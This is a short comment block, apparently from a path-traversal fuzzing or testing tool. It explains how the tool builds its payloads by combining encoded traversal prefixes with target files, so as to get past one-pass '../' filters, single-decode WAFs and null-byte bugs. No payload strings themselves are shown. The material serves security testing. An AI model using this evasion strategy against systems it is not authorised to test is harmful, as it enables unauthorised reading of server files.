# --------------------------------------------------------------------------
# Payload set
#
# Rather than hand-listing hundreds of near-duplicate traversal strings, the
# bulk of the arsenal is generated by combining TRAVERSAL_PREFIXES (traversal
# depth + encoding/obfuscation style) with TARGET_FILES (what to read once
# the traversal lands). Every stack behaves differently - a filter that
# strips literal "../" once, a WAF that only decodes a payload one extra
# time, a legacy null-byte bug - so covering many encodings against the
# handful of near-universal targets (CORE_TARGETS, every prefix) plus many
# targets against a handful of reliable techniques (BROAD_TARGETS, a curated
# prefix subset) gives wide real-world coverage without a full, wasteful
# cartesian product across everything.
# --------------------------------------------------------------------------

